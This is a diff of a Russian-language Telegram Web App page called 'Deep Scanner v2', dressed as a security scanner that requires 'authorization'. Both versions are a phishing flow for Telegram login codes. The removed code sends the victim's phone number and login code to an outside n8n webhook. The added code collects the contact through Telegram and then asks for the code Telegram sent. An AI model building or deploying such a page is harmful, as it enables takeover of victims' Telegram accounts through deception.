@@ -1,41 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deep Scanner v2</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://jenil.github.io/bulmaswatch/darkly/bulmaswatch.min.css">
+    <style>
+        body { background-color: #0e1117; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; color: #fdfdfd; }
+        .hero { position: fixed; top: 10px; width: 100%; text-align: center; }
+        .card { background-color: #1a1f2e; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.7); width: 90%; max-width: 380px; padding: 30px; transition: all 0.3s ease; }
+        .icon-circle { width: 90px; height: 90px; background-color: #313a55; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px auto; }
+        .icon-text { font-size: 50px; }
+        .input.is-dark { background-color: #0e1117; border-color: #313a55; color: #fdfdfd; text-align: center; letter-spacing: 5px; font-size: 24px; }
+        .input.is-dark::placeholder { letter-spacing: normal; font-size: 16px; color: #737373; }
+        .main-btn { width: 100%; border-radius: 10px; font-weight: bold; background-color: #377dff; border-color: #377dff; transition: background-color 0.2s; }
+        .main-btn:hover { background-color: #2660d1; border-color: #2660d1; }
+        .main-btn.is-success { background-color: #10a37f; border-color: #10a37f; }
+        .hidden { display: none !important; opacity: 0; }
+    </style>
 </head>
 <body>
-    <div id="step1">
-        <input type="text" id="phone" placeholder="+79990000000">
-        <button onclick="sendPhone()">Отправить номер</button>
+    <header class="hero">
+        <h1 class="title is-4 has-text-grey-light">DEEP SCANNER</h1>
+    </header>
+
+    <div class="card" id="step1">
+        <div class="icon-circle">
+            <span class="icon-text">🛡️</span>
+        </div>
+        <h2 class="title is-4 has-text-centered has-text-white">Авторизация</h2>
+        <p class="subtitle is-6 has-text-centered has-text-grey-light mb-5">Для начала работы подтвердите ваш аккаунт</p>
+        <div class="control">
+            <button class="button main-btn is-link is-large" onclick="requestPhone()">
+                <span>📲 Подтвердить номер</span>
+            </button>
+        </div>
     </div>
-    <div id="step2" style="display:none;">
-        <input type="text" id="code" placeholder="Код из SMS">
-        <button onclick="sendCode()">Войти</button>
+
+    <div class="card hidden" id="step2">
+        <div class="icon-circle">
+            <span class="icon-text">🔒</span>
+        </div>
+        <h2 class="title is-4 has-text-centered has-text-white">Введите код</h2>
+        <p class="subtitle is-6 has-text-centered has-text-grey-light mb-5">Мы отправили код подтверждения в Telegram</p>
+        <div class="field mb-5">
+            <div class="control">
+                <input class="input is-dark is-large" type="text" id="smsCode" placeholder="_____">
+            </div>
+        </div>
+        <div class="control">
+            <button class="button main-btn is-success is-large" id="loginBtn">
+                <span>Войти</span>
+            </button>
+        </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        let phoneCodeHash = "";
+        tg.ready();
+        tg.expand(); // Разворачиваем на весь экран сразу
 
-        async function sendPhone() {
-            const phone = document.getElementById('phone').value;
-            const res = await fetch('https://n8n.oxyn8n.su/webhook/auth', {
-                method: 'POST',
-                body: JSON.stringify({ action: 'sendPhone', phone })
+        function requestPhone() {
+            tg.requestContact((sent) => {
+                if (sent) {
+                    // Если номер отправлен, переключаем на ввод кода
+                    const step1 = document.getElementById('step1');
+                    const step2 = document.getElementById('step2');
+                    step1.classList.add('hidden');
+                    step2.classList.remove('hidden');
+                }
             });
-            const data = await res.json();
-            phoneCodeHash = data.phoneCodeHash; // Придет от n8n
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-        }
-
-        async function sendCode() {
-            const code = document.getElementById('code').value;
-            await fetch('https://n8n.oxyn8n.su/webhook/auth', {
-                method: 'POST',
-                body: JSON.stringify({ action: 'sendCode', code, phoneCodeHash })
-            });
-            alert("Авторизация прошла!");
         }
     </script>
 </body>
